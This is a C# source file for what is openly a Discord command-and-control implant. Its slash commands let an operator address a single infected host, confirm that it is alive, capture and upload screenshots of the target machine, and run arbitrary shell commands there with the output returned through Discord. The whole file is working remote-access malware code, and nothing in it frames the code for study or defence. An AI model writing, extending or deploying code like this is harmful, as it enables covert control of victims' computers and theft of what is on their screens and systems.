using Discord.Interactions;
using DiscordC2.Common;

public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionContext>
{
    public InteractionService Commands { get; set; }

    [SlashCommand("ping", "pong")]
    public async Task Ping(string id)
    {
        if (id != Utils.MD5Hash(Utils.HostId))
            return;

        await DeferAsync();
        await FollowupAsync($"{Utils.HostId} {Utils.MD5Hash(Utils.HostId)} alive");
    }

    [SlashCommand("screenshot", "take a screenshot of the target machine")]
    public async Task Screenshot(string id)
    {
        if (id != Utils.MD5Hash(Utils.HostId))
            return;
            
        await DeferAsync();
        await FollowupWithFileAsync(Utils.GetScreenshot(), "screenshot.png");
    }

    [SlashCommand("execute", "execute a command on the target machine")]
    public async Task Execute(string id, string command)
    {
        if (id != Utils.MD5Hash(Utils.HostId))
            return;

        await DeferAsync();
        string output = Utils.ExecuteCommandline(command);

        if (output == null)
        {
            await FollowupAsync("error");
        }

        if (output.Length > 2000-8) {
            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
            foreach (string chunk in chunks)
            {
                await Context.Channel.SendMessageAsync(chunk);
            }
            await FollowupAsync("executed");
        } else {
            await FollowupAsync($"```\n{output}\n```");
        }
        
    }
}